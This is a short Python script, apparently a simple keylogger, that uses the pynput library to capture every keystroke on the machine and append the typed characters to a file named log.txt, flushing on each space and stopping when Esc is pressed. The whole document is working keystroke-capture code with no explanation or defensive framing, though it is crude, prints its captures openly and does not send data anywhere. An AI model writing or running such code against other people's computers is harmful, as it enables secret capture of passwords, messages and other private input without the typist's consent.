import pynput
from datetime import datetime

from pynput.keyboard import Key, Listener
count= 0
keys = []
def on_press(key):
    global keys, count

    keys.append(key)
    count +=1
    if count >= 1:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            print(keys)
            count =0
            write_file(keys)
            keys = []


def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space")>0:
                file.write('\n')
            elif k.find("esc")>0:
                file.write('\n')
            if k.find("Key")== -1:
                file.write(k)
        

def on_release(key):
    if key==Key.esc:
        return False



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
